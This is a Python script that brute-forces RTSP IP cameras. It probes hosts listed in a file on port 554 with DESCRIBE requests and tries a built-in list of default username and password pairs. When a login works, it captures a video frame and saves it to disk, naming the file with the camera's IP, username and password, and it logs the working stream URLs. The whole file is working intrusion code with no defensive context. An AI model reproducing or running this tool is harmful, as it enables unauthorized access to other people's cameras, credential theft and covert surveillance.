import socket
from sys import argv
from time import sleep
from numpy import ndarray
from cv2 import VideoCapture, imwrite

def remove_forbidden_symbols(strng):
	forbidden_symbols = ['/','\\','*','?','"','<','>','|','+',' ','.','%','!','@']
	if type(strng) == int:
		return strng
	else:
		for s in forbidden_symbols:
			if s in strng:
				strng = strng.replace(s,'')
		return strng

def create_describe_packet(CRED,IP,PATH):
	global DESCRIBEPACKET
	DESCRIBEPACKET =  'DESCRIBE rtsp://%s@%s%s RTSP/1.0\r\n' % (CRED,IP,PATH)
	DESCRIBEPACKET += 'CSeq: 2\r\n'
	DESCRIBEPACKET += 'Accept: application/sdp\r\n'
	DESCRIBEPACKET += 'User-Agent: Mozilla/5.0\r\n\r\n'
	return DESCRIBEPACKET

def rtsp_connect(DESCRIBEPACKET, IP, PORT):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(TIMEOUT)
	s.connect((IP, PORT))
	s.sendto(DESCRIBEPACKET.encode(),(IP, PORT))
	data = repr(s.recv(1024))
	s.close()
	return data

def logging(url):
	with open('result.txt', 'a') as file:
		file.write(url + '\n')



def get_capture(url):
	if 'FAKE' in url:
		return False
	vcap = VideoCapture(url)
	ret, frame = vcap.read()
	if type(frame) != ndarray:
		return False
	else:
		ip = url.split('/')[2].split('@')[1]
		usr = url.split('/')[2].split('@')[0].split(':')[0]
		pwd = url.split('/')[2].split('@')[0].split(':')[1]
		path = url.split('/')[3]
		path = remove_forbidden_symbols(path)
		imwrite('pics/%s_%s_%s_%s.jpg' % (ip, usr, pwd, path), frame)
		return True

if __name__ == '__main__':
	
	DESCRIBEPACKET = ""
	TIMEOUT = 5
	PORT = 554
	CRED = '''admin:12345
1111:1111
user:user
admin:123456
admin:00000000
admin:1111
admin:admin
admin:4321
admin:1111111
admin:123123
admin:qwerty
admin:admin123
administrator:'''
	CRED = CRED.split('\n')

	with open("routes.txt", "r") as routes:
		ROUTES = routes.read().split()
	with open("hosts.txt", "r") as hosts:
		HOSTS = hosts.read().split()

	for (line, host) in enumerate(HOSTS):
		state = False
		state_str = "[%s/%d]" % (line+1, len(HOSTS))
		dots = '.'*(len(state_str)-3)
		print("%s Working with %s" % (state_str, host))
		for route in ROUTES:
			try:
				create_describe_packet('', host, route)
				data = rtsp_connect(DESCRIBEPACKET, host, PORT)
				#print(data)
				#sleep(12)
				if '404 Not Found' not in data and '\x15\x00\x00\x00\x02\x02' not in data and '400' not in data and '403' not in data and '451' not in data and '503' not in data:
					#print(data)
					print(dots + '[+] Starting bruteforce')
					for (i,cred) in enumerate(CRED):
						create_describe_packet(cred, host, route)
						data = rtsp_connect(DESCRIBEPACKET, host, PORT)
						#print(data)
						if '401 Unauthorized' not in data and '503' not in data:
							url = "rtsp://%s@%s%s" % (cred, host, route)
							print(dots + '[+] Successful! ' + url)
							if get_capture(url):
								print(dots + '[+] Snapshot was downloaded! ')
								logging(url)
							else:
								print(dots + '[-] Fake trigger')
							state = True
							break
						if i+1 == len(CRED):
							url = 'rtsp://' + host + route
							print(dots+ '[-] Bruteforce has failed')
							logging(url)
							state = True
							break
				if state: break
			except KeyboardInterrupt:
				print(dots + '[-] Terminated by user...')
				exit()
			except socket.timeout:
				print(dots + '[-] Socket timeout')
				break
			except:
				print(dots + '[-] Connection error')
				break

